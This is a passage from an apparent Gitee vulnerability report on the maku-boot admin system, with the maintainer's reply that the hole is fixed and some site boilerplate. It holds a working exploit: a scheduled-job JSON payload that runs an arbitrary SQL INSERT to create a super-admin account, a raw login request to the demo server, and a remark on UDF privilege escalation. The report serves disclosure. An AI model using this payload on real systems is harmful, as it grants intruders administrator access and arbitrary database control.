{"id":24,"jobName":"test","jobGroup":"default","beanName":"jdbcTemplate","method":"execute","params":"INSERT INTO sys\_user (id, username, password, real\_name, avatar, gender, email, mobile, status, org\_id, super\_admin, version, deleted, creator, create\_time, updater, update\_time) VALUES (10099, 'test123', '{bcrypt}$2a$10$mW/yJPHjyueQ1g26WNBz0uxVPa0GQdJO1fFZmqdkqgMTGnyszlXxu', 'test', 'https://cdn.maku.net/images/avatar.png', 0, 'babamu@126.cn', '13612345586', 1, null, 1, 0, 0, 10000, now(), 10000, now());","cronExpression":"\* \* \* \* \* ? \*","status":0,"concurrent":1,"remark":"","createTime":"2022-11-07 11:23:34"}

```

After the sql statement is successfully executed, an administrator user test123/admin is created

4. Log in to the system as test123/admin

![输入图片说明](https://foruda.gitee.com/images/1667809015950851195/f9b1cd5e\_7554608.png "屏幕截图")

The packet is as follows：

```

POST /maku-boot-server/sys/auth/login HTTP/1.1

Host: demo.maku.net

Cookie: Hm\_lvt\_dd01f60c05c4a94d3287dd7c580372ff=1667440588; Hm\_lpvt\_dd01f60c05c4a94d3287dd7c580372ff=1667468738

Content-Length: 104

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"

Accept: application/json, text/plain, \*/\*

Content-Type: application/json;charset=UTF-8

Accept-Language: zh-CN

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36

Sec-Ch-Ua-Platform: "Windows"

Origin: https://demo.maku.net

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://demo.maku.net/maku-boot/

Accept-Encoding: gzip, deflate

Connection: close

{"username":"test123","password":"admin","key":"30aef83e-2804-49ea-acb5-b5678cdc27dc","captcha":"bdrgr"}

```

Login successful

![输入图片说明](https://foruda.gitee.com/images/1667809061927753546/2c2c6ffa\_7554608.png "屏幕截图")

In addition, any sql statements can be executed, and the maku-boot program supports mysql and postgresql databases. Therefore, the udf may upgrade permissions and execute commands

Expand operation logs

Collapse operation logs

[![8562901 baba alex 1621242500](https://foruda.gitee.com/avatar/1677141809288038692/8562901_baba-alex_1621242500.png!avatar60)
阿沐](/babamu)owner

*复制链接地址*

已修复，感谢

误判申诉

此处可能存在不合适展示的内容，页面不予展示。您可通过相关编辑功能自查并修改。

如您确认内容无涉及 不当用语 / 纯广告导流 / 暴力 / 低俗色情 / 侵权 / 盗版 / 虚假 / 无价值内容或违法国家有关法律法规的内容，可点击提交进行申诉，我们将尽快为您处理。

取消
提交

[![8562901 baba alex 1621242500](https://foruda.gitee.com/avatar/1677141809288038692/8562901_baba-alex_1621242500.png!avatar100)](/babamu "babamu")
[阿沐](/babamu "babamu")link commit**[makunet/maku-boot Commit 446eb72](/makunet/maku-boot/commit/446eb7294332efca2bfd791bc37281cedac0d0ff)**

[![8562901 baba alex 1621242500](https://foruda.gitee.com/avatar/1677141809288038692/8562901_baba-alex_1621242500.png!avatar100)](/babamu "babamu")
[阿沐](/babamu "babamu") changed **issue state** from **待办的** to **已完成**

[Sign in](/login)
to comment

Status

Done

Backlog

Doing

Done

Closed

Assignees

Not set

Labels

Not set

[Label settings](/makunet/maku-boot/labels)

Milestones
No related milestones

No related milestones

Pull Requests
None yet

None yet

Successfully merging a pull request will close this issue.

Branches
No related branch

Branches (1)

Tags (25)

master

v4.7.0
v4.6.0
v4.5.0
v4.4.0
v4.3.0
v4.2.0
v4.1.0
v4.0.0
v3.6.0
v3.5.0
v3.4.0
v3.3.0
v3.2.0
v3.1.0
v3.0.0
v2.5.0
v2.4.0
v2.3.1
v2.3.0
v2.2.0
v2.1.0
v2.0.0
v1.5.0
v1.4.0
v1.3.0

Planed to start   -   Planed to end

-

Top level

Not Top

Top Level: High

Top Level: Medium

Top Level: Low

Priority

Not specified

Serious

Main

Secondary

Unimportant

参与者（2）
[![8562901 baba alex 1621242500](https://foruda.gitee.com/avatar/1677141809288038692/8562901_baba-alex_1621242500.png!avatar30)](/babamu)
[![7554608 h3110n3w0r11d 1670478742](https://foruda.gitee.com/avatar/1670478742927774372/7554608_h3110n3w0r11d_1670478742.png!avatar30)](/h3110n3w0r11d)

Java
1
https://gitee.com/makunet/maku-boot.git
git@gitee.com:makunet/maku-boot.git
makunet
maku-boot
maku-boot

[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106666)](https://gitee.com)
©OSCHINA. All rights reserved

[Git Resources](/all-about-git)

[Learning Git](https://help.gitee.com/learn-Git-Branching/)

[CopyCat](https://copycat.gitee.com/)

[Downloads](/appclient)

[Gitee Reward](/gitee_reward)

[Gitee Stars](/gitee-stars)

[Featured Projects](/gvp)

[Blog](https://blog.gitee.com/)

[Nonprofit](/enterprises#nonprofit-plan)

[Gitee Go](https://gitee.com/features/gitee-go)

[OpenAPI](/api/v5/swagger)

[Help Center](https://help.gitee.com)

[Self-services](/self_services)

[Updates](/help/articles/4378)

[About Us](/about_us)

[Join us](https://www.oschina.net/news/131099/oschina-hiring)

[Terms of use](/terms)

[Feedback](/oschina/git-osc/issues)

[Partners](/links.html)

![Exchange](https://cn-assets.gitee.com/assets/contact_qr-5e2c2a8da453396590e56a545bce4974.jpg)

Exchange

![微信服务号](https://cn-assets.gitee.com/assets/qrcode-weixin@2x-b74cc97a2ea80123ea53a737f709836d.png)

WeChat

client#oschina.cn
Enterprise:400-606-0201

Pro：
13670252304

13352947997

![开放原子开源基金会](https://cn-assets.gitee.com/assets/logo-openatom-d083391cc8a54e283529f3fc11cc38ca.svg)
[OpenAtom Foundation](https://www.openatom.org/)
Cooperative code hosting platform

![违法和不良信息举报中心](https://cn-assets.gitee.com/assets/12377@2x-1aa42ed2d2256f82a61ecf57be1ec244.png)
[违法和不良信息举报中心](https://12377.cn)

[粤ICP备12009483号](http://beian.miit.gov.cn/)

[简 体](/language/zh-CN)
/
[繁 體](/language/zh-TW)
/
[English](/language/en)

Going to Help Center
### Search

[Git 命令在线学习](https://oschina.gitee.io/learn-git-branching/?utm_source==gitee-help-widget "Git 命令在线学习")[如何在 Gitee 导入 GitHub 仓库](https://gitee.com/help/articles/4261?utm_source==gitee-help-widget "如何在 Gitee 导入 GitHub 仓库")
[Git 仓库基础操作](/help/articles/4114)

[企业版和社区版功能对比](/help/articles/4166)

[SSH 公钥设置](/help/articles/4191)

[如何处理代码冲突](/help/articles/4194)

[仓库体积过大，如何减小？](/help/articles/4232)

[如何找回被删除的仓库数据](/help/articles/4279)

[Gitee 产品配额说明](/help/articles/4283)

[GitHub仓库快速导入Gitee及同步更新](/help/articles/4284)

[什么是 Release（发行版）](/help/articles/4328)

[将 PHP 项目自动发布到 packagist.org](/help/articles/4354)

Repository Report

Back to the top

Login prompt

This operation requires login to the code cloud account. Please log in before operating.

Go to login

No account. Register



=== Content from gitee.com_80df545a_20250115_093253.html ===


![logo](/static/images/logo.svg?t=158106664)
#

## Enterprise-level DevOps R&D management platform

  霍泰稳 极客邦科技创始人  类似 GitHub 这样的代码托管服务，是软件研发过程中不可缺少的一环，在国内目前还没有特别好的服务，Gitee 很好地填补了这个空白。一起努力，越来越好，为中国技术人群提供更多更贴心的服务。

[**Gitee Enterprise**
-
Enterprise-level DevOps R&D management platform](/enterprises?from=login)

## Sign in

New to Gitee?
[Create an account.](/signup?redirect_to_url=%2Fmakunet%2Fmaku-boot%2Fcommit%2F446eb7294332efca2bfd791bc37281cedac0d0ff#lang=zh-CN)

Remember me

Sign in with SMS

[Forgot password?](/password/new)

Send verification code

Verification code not received?
[get help](/self_services)

Remember me

[Sign in with password](/login)

[Forgot password?](/password/new)

[Sign in with OSChina account](https://gitee.com/auth/oschina)
Sign in with other accounts

[海外华人？使用英文版登录 / Non-China users? Click here](#lang=en)

[© Gitee.com](https://gitee.com/)

[About Us](/about_us)

[Terms of use](/terms)

[Help Center](https://help.gitee.com)

[Self-services](/self_services)

[resend email to activate account](/user/activate)

![Logo](https://cn-assets.gitee.com/assets/logo-ab55995e37e5dd6b6914f640de8c0f1e.png)

# Welcome to Gitee

[![Google logo](https://cn-assets.gitee.com/assets/i18n/google-logo-52e1136adec4a20c6c25dae1686a878d.svg)
Continue with Google](https://gitee.com/auth/google_oauth2)[![Github logo](https://cn-assets.gitee.com/assets/i18n/github-logo-c99138751876696c092b4221c7848c96.svg)
Continue with Github](https://gitee.com/auth/github)OR

please enter your vaild email
Continue with Email
By creating an account, you agree to the
[Terms of Use](/terms)
as well as
[Non-active Account Processing Specification](/inactive_accounts)
如果您是中国用户，可以
[跳转到中文版登陆页](#lang=zh-CN)
[，或者中文版注册页](/signup#lang=zh-CN)

![Return](https://cn-assets.gitee.com/assets/i18n/return-68ac94bb6416c186c44af2a002e87335.svg)
return

![Logo](https://cn-assets.gitee.com/assets/logo-ab55995e37e5dd6b6914f640de8c0f1e.png)

# No Gitee account related to this email

##### Only one step left to create a account

![Email](https://cn-assets.gitee.com/assets/i18n/email-03f79609c41a5d2bbe87f1fe9f0dbf87.svg)

email

![Verification code](https://cn-assets.gitee.com/assets/i18n/verification-code-48f1c135c0d66b0db2e7cd0ed02a88f7.svg)

verification code

Send me the verification code

Resend

Create account

![Return](https://cn-assets.gitee.com/assets/i18n/return-68ac94bb6416c186c44af2a002e87335.svg)
return

![Logo](https://cn-assets.gitee.com/assets/logo-ab55995e37e5dd6b6914f640de8c0f1e.png)

# Your email has a Gitee account

##### If Gitee account is yours, please bind it with your account by verifying your password

Yes，that's mine
Go Back

![Return](https://cn-assets.gitee.com/assets/i18n/return-68ac94bb6416c186c44af2a002e87335.svg)
return

![Logo](https://cn-assets.gitee.com/assets/logo-ab55995e37e5dd6b6914f640de8c0f1e.png)

#

##### This will bind your account with Gitee account. If it's binding another account,it will unbind first.

![Email](https://cn-assets.gitee.com/assets/i18n/email-03f79609c41a5d2bbe87f1fe9f0dbf87.svg)

email

![Password](https://cn-assets.gitee.com/assets/i18n/password-620a1d0e7f144cb79fdc0fa4cd337b95.svg)

password

![]()

Log in
[Forget password?](/password/new)

[© Gitee.com](https://gitee.com/)

[About Us](/about_us)

[Terms of use](/terms)

[Help Center](https://help.gitee.com)

[Self-services](/self_services)

[resend email to activate account](/user/activate)


